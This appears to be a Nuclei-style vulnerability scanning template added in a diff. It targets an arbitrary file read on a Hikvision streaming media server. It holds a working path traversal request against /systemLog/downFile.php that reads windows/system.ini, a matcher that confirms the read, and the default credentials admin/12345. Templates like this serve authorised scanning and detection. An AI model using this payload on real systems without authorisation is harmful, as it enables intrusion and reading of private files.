@@ -1,0 +1,23 @@
+id: hikvision-stream-server-backend-file-read
+
+info:
+  name: HIKVISION 海康威视 流媒体管理服务器后台任意文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    默认凭证 admin/12345 可被利用实现任意文件访问
+  tags: HIKVISION
+
+http:
+- raw:
+  - |
+    GET /systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
